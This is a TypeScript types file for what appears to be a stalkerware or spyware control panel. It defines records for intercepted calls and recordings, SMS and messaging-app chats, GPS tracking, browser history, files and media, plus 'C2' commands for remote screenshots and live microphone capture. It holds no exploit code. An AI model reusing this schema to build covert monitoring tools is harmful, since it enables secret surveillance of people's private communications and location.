// Types matching the Laravel API Resources — Device telemetry, C2 commands, restrictions

// ── Device (DeviceResource) ──────────────────────────────────────────────────

export interface Device {
  id: number
  uuid: string
  platform: string | null
  brand: string | null
  model: string | null
  os_version: string | null
  app_version: string | null
  device_name: string | null
  ip_address: string | null
  fcm_token: string | null
  call_recording_enabled: boolean
  microphone_recording_interval: number
  microphone_recording_continuous: boolean
  screen_recording_enabled: boolean
  sync_status: 'idle' | 'syncing'
  sync_started_at: string | null
  created_at: string | null
  updated_at: string | null
}

// ── Telemetry feeds ──────────────────────────────────────────────────────────

export interface DeviceCall {
  id: number
  device_id: number
  contact_name: string | null
  phone_number: string
  call_type: 'incoming' | 'outgoing' | 'missed'
  duration: number
  recorded_at: string | null
  call_recorded: boolean
  recording_path: string | null
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export type ThreadChannel = 'sms' | 'whatsapp' | 'telegram' | 'instagram' | 'messenger' | 'tiktok'
export type SmsStatus = 'received' | 'delivered' | 'failed' | 'draft' | 'sending' | 'queued'

export interface SmsThread {
  address: string
  normalized_address: string
  contact_name: string | null
  is_corporate: boolean
  last_body: string
  last_type: 'inbox' | 'sent' | null
  last_date: string | null
  last_sms_status: SmsStatus | null
  message_count: number
  inbox_count: number
  sent_count: number
  failed_count: number
  deleted_count: number
  channel: ThreadChannel
  unread: boolean
}

export interface DeviceSms {
  id: number
  device_id: number
  address: string
  body: string
  type: 'inbox' | 'sent'
  sms_status: SmsStatus | null
  date: string | null
  sync_hash: string
  local_sqlite_id: number
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceContact {
  id: number
  device_id: number
  name: string
  phone_number: string
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceNotification {
  id: number
  device_id: number
  package_name: string
  title: string | null
  body: string | null
  date: string | null
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceGpsLocation {
  id: number
  device_id: number
  latitude: number
  longitude: number
  altitude: number | null
  accuracy: number | null
  recorded_at: string | null
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceGeofence {
  id: number
  device_id: number
  name: string
  latitude: number
  longitude: number
  radius: number
  is_active: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceGeofenceAlert {
  id: number
  device_id: number
  geofence: DeviceGeofence | null
  event_type: 'enter' | 'exit'
  latitude: number
  longitude: number
  triggered_at: string | null
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceSocialMessage {
  id: number
  device_id: number
  platform: string
  sender_name: string
  message: string
  date: string | null
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceBrowserHistory {
  id: number
  device_id: number
  url: string
  title: string | null
  visited_at: string | null
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceInstalledApp {
  id: number
  device_id: number
  app_name: string
  package_name: string
  installed_at: string | null
  is_blocked: boolean
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceFile {
  id: number
  device_id: number
  path: string
  file_name: string
  file_size: number
  is_directory: boolean
  file_created_at: string | null
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

export interface DeviceMedia {
  id: number
  device_id: number
  media_type: 'image' | 'video' | 'audio'
  origin_app: string
  file_name: string
  file_size: number
  path: string
  sync_hash: string
  local_status: string
  deleted_at_source: boolean
  created_at: string | null
  updated_at: string | null
}

// ── Restrictions (DeviceRestrictionRuleResource) ─────────────────────────────

export type RestrictionRuleType = 'block_calls' | 'sms_filter' | 'app_block' | 'module_toggle'

export interface DeviceRestrictionRule {
  id: number
  device_id: number
  rule_type: RestrictionRuleType
  is_enabled: boolean
  parameters: Record<string, unknown>
  created_at: string | null
  updated_at: string | null
}

// ── Commands (C2) ────────────────────────────────────────────────────────────

export type CommandType = 'screenshot' | 'screen_recording' | 'live_mic'
export type CommandStatus = 'pending' | 'processing' | 'completed' | 'failed'

export interface DeviceRemoteCommand {
  id: number
  device_id: number
  command_type: CommandType
  status: CommandStatus
  parameters: Record<string, unknown>
  result_path: string | null
  triggered_at: string | null
  completed_at: string | null
  created_at: string | null
  updated_at: string | null
}

// ── Support tickets ──────────────────────────────────────────────────────────

export interface SupportTicket {
  id: string
  subject: string
  status: 'Actif' | 'Résolu' | 'En attente'
  date: string
  messages: SupportMessage[]
}

export interface SupportMessage {
  id: number
  from: string
  text: string
  time: string
  isUser: boolean
}

// ── Dashboard feed (synthetic, built from multiple feeds) ────────────────────

export type FeedTag = 'APP' | 'SMS' | 'ZONE' | 'APPEL' | 'WEB' | 'NOTIF' | 'GEO'

export interface FeedEvent {
  id: string
  time: string
  tag: FeedTag
  text: string
  dot: string
}
